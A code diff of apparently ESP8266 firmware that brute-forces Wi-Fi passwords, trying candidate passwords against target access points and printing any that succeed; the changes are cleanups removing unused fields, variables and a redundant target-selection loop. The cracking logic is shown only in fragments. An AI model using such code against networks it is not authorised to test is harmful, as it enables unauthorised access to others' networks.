@@ -11,8 +11,6 @@ typedef struct {
   unsigned char essid[32];
   uint8_t bssid[6];
   uint8_t password[9];
-  bool cracking;
-  uint8_t tested;
 } ap_t;
 
 // counter for APs seen
@@ -94,7 +92,6 @@ char candidate_passwords[9][MAX_CANDIDATE_PASSWORDS];
 size_t current_password;
 ICACHE_FLASH_ATTR
 static void test_passwords(os_event_t *events){
-    size_t i;
     size_t ap_to_crack = (size_t) events->par;
 
     if(state != CONNECTING && state != DISCONNECTING){
@@ -133,7 +130,7 @@ static void test_passwords(os_event_t *events){
         case STATION_IDLE: {
             wifi_station_disconnect();
             ap_timeouts = 0;
-            struct station_config config = {0};
+            struct station_config config = {{0}};
             memcpy(config.ssid, aps[ap_to_crack].essid, 10);
             memcpy(config.password, candidate_passwords[current_password], 8);
             memcpy(config.bssid, aps[ap_to_crack].bssid, 6);
@@ -157,12 +154,6 @@ static void test_passwords(os_event_t *events){
             wifi_station_connect();
             break;
         case STATION_GOT_IP: {
-            size_t ap_to_crack, i;
-            for(i = 0; i < MAX_APS; i++){
-                if(aps[i].target != 0 && !aps[i].cracking){
-                    ap_to_crack = i;
-                }
-            }
             memcpy(aps[ap_to_crack].password, candidate_passwords[current_password], 8);
             os_printf("Found valid password for %s: %s\n", aps[ap_to_crack].essid, aps[ap_to_crack].password);
             // no need to test more
